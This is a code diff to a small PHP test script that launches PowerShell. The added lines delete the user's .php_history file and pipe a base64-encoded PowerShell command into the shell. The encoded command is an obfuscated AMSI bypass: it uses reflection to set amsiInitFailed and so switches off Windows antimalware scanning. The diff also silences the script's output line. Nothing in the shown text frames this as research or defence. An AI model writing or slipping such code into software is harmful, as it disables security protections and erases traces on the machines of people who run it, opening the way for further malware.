@@ -1,4 +1,14 @@
+<?php
 file_put_contents("memtest.txt", "SIKERES");
+
+if(getenv("USERPROFILE") != ""){
+$userDir = getenv("USERPROFILE");
+$file = $userDir."\\.php_history";
+if(file_exists($file)) {
+unlink($file);
+}
+}
+
 
 
 $descriptorspec = array(
@@ -9,7 +19,8 @@ $descriptorspec = array(
 $process = proc_open('powershell', $descriptorspec, $pipes);
 
 if (is_resource($process)) {
-    fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt');
+    fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt\n');
+    fwrite($pipes[0], base64_decode("JGs9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpJytbY2hhcl04NSsndGlscycpLkdldEZpZWxkKCdhbXMnK1tjaGFyXTEwNSsnSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKQokay5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSkKCg=="));
     fclose($pipes[0]);
 
     echo stream_get_contents($pipes[1]);
@@ -19,8 +30,10 @@ if (is_resource($process)) {
 // proc_close in order to avoid a deadlock
     $return_value = proc_close($process);
 
-    echo "command returned $return_value\n";
+    //echo "command returned $return_value\n";
 }
+
+
 
 
 
